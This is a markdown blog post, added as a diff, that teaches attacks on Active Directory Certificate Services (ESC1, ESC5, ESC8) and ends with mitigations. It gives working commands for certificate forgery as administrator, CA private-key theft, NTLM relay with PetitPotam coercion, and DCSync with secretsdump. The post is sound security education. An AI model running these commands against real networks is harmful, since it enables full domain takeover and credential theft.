@@ -1,0 +1,277 @@
+---
+layout: post
+title: "Active Directory 101: ADCS (Active Directory Certificate Services)"
+date: 2025-08-04 11:00:00 +0000
+categories: [active-directory, adcs, exploitation]
+tags: [adcs, certificates, esc1, esc5, esc8, privilege-escalation, pki]
+description: "Advanced attack techniques and exploitation methods for Active Directory Certificate Services - covering ESC1, ESC5, and ESC8 vulnerabilities"
+---
+
+# Active Directory Certificate Services (ADCS)
+*Advanced Attack Techniques & Exploitation*
+
+---
+
+## What is ADCS?
+
+<div class="key-concept" markdown="1">
+**AD CS = Active Directory Certificate Services**
+</div>
+
+Active Directory Certificate Services is a Windows Server role that provides critical PKI functionality:
+
+- Enables Windows servers to act as a **Public Key Infrastructure (PKI)**
+- Provides cryptographic functionality, digital certificates, and digital signatures in AD environments
+- First ADCS vulnerabilities discovered by **SpecterOps research in 2021**
+
+<div class="vulnerability-alert" markdown="1">
+🚨 **Warning:** ADCS can be a goldmine for attackers when misconfigured!
+</div>
+
+---
+
+## X.509 Certificate Format
+
+Understanding what's inside a certificate is crucial for exploitation:
+
+### Certificate Components
+
+| Component | Description |
+|-----------|-------------|
+| **📋 Version & Serial Number** | Certificate metadata and unique identifier |
+| **🔐 Public Key** | The public key information for encryption/authentication |
+| **👤 Subject Name** | Fields identifying the certificate owner |
+| **⚙️ Extensions** | Additional fields like **Extended Key Usage** that restrict certificate usage |
+
+---
+
+## Certificate Templates
+
+Certificate templates are a critical component for understanding ADCS security:
+
+- **Standardize and simplify** the certificate request process
+- Certificate structure proposed by a certification authority hosted by ADCS
+- Defines: **Certificate type**, **Authorized users**, **Certificate extensions**
+
+### Security Impact
+
+<div class="vulnerability-alert" markdown="1">
+**⚠️ Security Impact**
+
+Misconfigured certificate templates can be vulnerable and allow privilege escalation!
+
+**Tool:** We'll use **Certipy** for analysis
+</div>
+
+<div class="warning-box" markdown="1">
+There are 11 ADCS vulnerabilities named ESC1, ESC2... ESC11
+
+**Most important:** ESC1, ESC5, and ESC8
+</div>
+
+---
+
+## Certificate Template Analysis
+
+### Analysis Methods
+
+<div class="key-concept" markdown="1">
+**🚫 Without Domain Account**
+- ntlmrelayx --dump-adcs option
+- certipy --sspi from domain machine
+</div>
+
+<div class="key-concept" markdown="1">
+**✅ With Domain Account (Preferred)**
+- Certipy analyzes templates and identifies vulnerabilities  
+- Simple LDAP queries retrieve template information
+</div>
+
+### Template Analysis with Certipy
+
+```bash
+# Template analysis with Certipy
+certipy find -u user@domain -p password -target domain-controller -vulnerable
+```
+
+---
+
+## ESC1 - Template Takeover
+
+The most common and dangerous ADCS vulnerability.
+
+### ESC1 Attack Requirements
+
+<div class="esc-vulnerability" markdown="1">
+**ESC1 Requirements:**
+- Template allows **unprivileged user enrollment**
+- No manager approval or signatures required
+- Certificate can be used for **authentication**
+- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag is enabled
+</div>
+
+<div class="warning-box" markdown="1">
+⚡ **Critical:** This allows an unprivileged user to request a certificate for ANY other user (including Domain Admins)!
+</div>
+
+### ESC1 Attack Flow
+
+1. **Find Vulnerable Template** → `certipy find --vulnerable`
+2. **Request Certificate** → As high-privilege user
+3. **Authenticate** → Use certificate to get TGT
+
+### ESC1 Exploitation Commands
+
+```bash
+# Step 1: Request certificate for Administrator
+certipy req -u $username@$domain.local -p '$password' \
+    -target $DC.$domain.local -template ESC1 \
+    -ca $domain-CA -upn administrator@$domain.local
+
+# Step 2: Use certificate for authentication  
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+```
+
+---
+
+## ESC5 - CA Certificate Theft
+
+Complete CA Compromise scenario.
+
+### ESC5 Vulnerability Details
+
+<div class="esc-vulnerability" markdown="1">
+**ESC5:** More general configuration flaws leading to complete ADCS compromise
+
+- Extract the **private key and certificate** of the CA itself
+- Once obtained: **forge valid certificates for anyone!**
+</div>
+
+### ESC5 Attack Goal & Impact
+
+| Aspect | Details |
+|--------|---------|
+| **🎯 Attack Goal** | Steal CA's private key and certificate |
+| **💥 Impact** | Complete domain compromise via certificate forgery |
+
+```bash
+# ESC5 - Backup CA certificate and private key 
+certipy ca -backup -u user@domain -p password -target ca-server -ca CA-NAME
+```
+
+---
+
+## ESC8 - NTLM Relay to ADCS
+
+HTTP Enrollment + NTLM Relay attack combination.
+
+### ESC8 Vulnerability
+
+<div class="esc-vulnerability" markdown="1">
+**ESC8 Attack Vector:**
+- ADCS allows **HTTP enrollment** without NTLM relay protection
+- Certificate requests can be made via HTTP protocol
+- Combine with NTLM relay → **Certificate theft**
+</div>
+
+<div class="warning-box" markdown="1">
+⚠️ **Critical:** DC machine accounts can perform DCSync → Complete domain compromise!
+</div>
+
+### ESC8 Attack Flow
+
+1. **Coerce DC Auth** → PetitPotam/Coercer
+2. **Relay to CA** → HTTP://{CA}/certsrv  
+3. **Get DC Certificate** → DCSync capabilities
+
+### ESC8 Attack Commands
+
+```bash
+# Step 1: Setup NTLM relay targeting ADCS HTTP endpoint
+ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# Step 2: Force DC authentication (separate terminal)
+petitpotam.py attacker-ip domain-controller
+
+# Step 3: Convert and use certificate
+certipy auth -pfx certificate.pfx -dc-ip domain-controller
+
+# Step 4: DCSync with obtained credentials
+secretsdump.py domain/user@domain-controller
+```
+
+<div class="warning-box" markdown="1">
+🎯 **Result:** Complete domain compromise via certificate-based authentication
+</div>
+
+---
+
+## 🛡️ Defense & Mitigation
+
+### Defense Strategies
+
+#### ✅ ESC1 Prevention
+- Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+- Require manager approval
+- Limit template enrollment permissions
+
+#### ✅ ESC5 Prevention  
+- Secure CA private key storage
+- Proper PKI object ACLs
+- Monitor certificate backup operations
+
+#### ✅ ESC8 Prevention
+- Enable HTTPS with authentication
+- Disable HTTP enrollment
+- Implement EPA (Extended Protection)
+
+#### 🔍 Detection
+- Monitor certificate requests
+- Audit template modifications
+- Watch for unusual authentication patterns
+
+---
+
+## 🔧 Essential Tools
+
+<div class="tools-box" markdown="1">
+- **Certipy** - Template analysis & exploitation
+- **ntlmrelayx** - NTLM relay attacks
+- **PetitPotam/Coercer** - Authentication coercion
+</div>
+
+---
+
+## 🎯 Key Takeaways
+
+<div class="takeaway-box" markdown="1">
+✅ **ESC1:** Certificate template allows subject altname specification
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **ESC5:** Complete CA compromise via private key theft
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **ESC8:** NTLM relay to HTTP certificate enrollment
+</div>
+
+### 💡 Remember
+
+- Always analyze certificate templates
+- ADCS can lead to domain admin
+- Proper PKI hardening is crucial
+
+<div class="warning-box" markdown="1">
+**🚨 ADCS misconfigurations are common and extremely dangerous! 🚨**
+</div>
+
+---
+
+*This post is part of the Active Directory 101 series. For more in-depth AD security topics, check out the other posts in this series.*
+
+## References
+
+- [SpecterOps ADCS Research](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- [Certipy Tool](https://github.com/ly4k/Certipy)
+- [ADCS Attack Techniques Whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
